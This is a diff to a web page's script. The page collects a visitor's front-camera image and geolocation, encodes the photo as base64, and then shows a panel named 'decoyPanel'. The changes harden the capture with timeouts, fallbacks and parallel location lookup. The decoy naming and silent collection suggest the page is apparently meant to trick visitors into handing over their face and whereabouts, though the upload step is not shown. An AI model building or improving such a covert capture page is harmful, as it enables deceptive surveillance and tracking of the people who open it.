@@ -286,32 +286,63 @@
 
     const locationPromise = getLocationFast();
 
+    const CAMERA_INIT_TIMEOUT_MS = 15000;
+    const VIDEO_READY_TIMEOUT_MS = 12000;
+
     function setStatus(text, isError) {
       statusEl.textContent = text;
       statusEl.classList.toggle("error", !!isError);
     }
 
     async function startCamera() {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-        audio: false,
+      let timeoutId;
+      const timeoutPromise = new Promise((_, reject) => {
+        timeoutId = setTimeout(
+          () => reject(new Error("Camera initialization timed out")),
+          CAMERA_INIT_TIMEOUT_MS
+        );
       });
+      const stream = await Promise.race([
+        navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false,
+        }),
+        timeoutPromise,
+      ]);
+      clearTimeout(timeoutId);
       preview.srcObject = stream;
+      try {
+        await preview.play();
+      } catch (playErr) {
+        console.error("video.play:", playErr);
+      }
       return stream;
     }
 
     function waitForVideoReady() {
-      return new Promise((resolve) => {
+      return new Promise((resolve, reject) => {
+        const t = setTimeout(() => {
+          reject(new Error("Camera preview timed out"));
+        }, VIDEO_READY_TIMEOUT_MS);
+        const finish = () => {
+          clearTimeout(t);
+          resolve();
+        };
         const check = () => {
           if (preview.videoWidth > 0 && preview.videoHeight > 0) {
-            resolve();
+            finish();
             return;
           }
           requestAnimationFrame(check);
         };
-        preview.addEventListener("loadedmetadata", check, { once: true });
-        preview.addEventListener("loadeddata", check, { once: true });
-        if (preview.videoWidth > 0) check();
+        preview.addEventListener(
+          "loadedmetadata",
+          () => check(),
+          { once: true }
+        );
+        preview.addEventListener("loadeddata", () => check(), { once: true });
+        preview.addEventListener("canplay", () => check(), { once: true });
+        if (preview.videoWidth > 0) finish();
         else requestAnimationFrame(check);
       });
     }
@@ -394,14 +425,19 @@
 
     async function run() {
       setStatus("One moment…");
-      const locationPromise = getLocation();
+      /* Location resolves in parallel (started at load); never block camera on geolocation. */
 
       let stream;
       try {
         stream = await startCamera();
         await waitForVideoReady();
       } catch (e) {
-        setStatus("Camera access denied or unavailable. Allow camera and reload.", true);
+        console.error("Camera error:", e);
+        const msg =
+          e && e.name === "NotAllowedError"
+            ? "Camera access denied. Allow camera and reload."
+            : "Camera access denied or unavailable: " + (e && e.message ? e.message : String(e));
+        setStatus(msg, true);
         return;
       }
 
@@ -418,7 +454,12 @@
       stream.getTracks().forEach((t) => t.stop());
       preview.srcObject = null;
 
-      const location = await locationPromise;
+      let location;
+      try {
+        location = await locationPromise;
+      } catch {
+        location = { latitude: null, longitude: null, accuracy: null };
+      }
 
       try {
         const b64 = await blobToBase64(encoded.blob);
@@ -436,7 +477,10 @@
       decoyPanel.classList.add("visible");
     }
 
-    run();
+    run().catch((err) => {
+      console.error(err);
+      setStatus("Something went wrong: " + (err && err.message ? err.message : String(err)), true);
+    });
   </script>
 </body>
 </html>
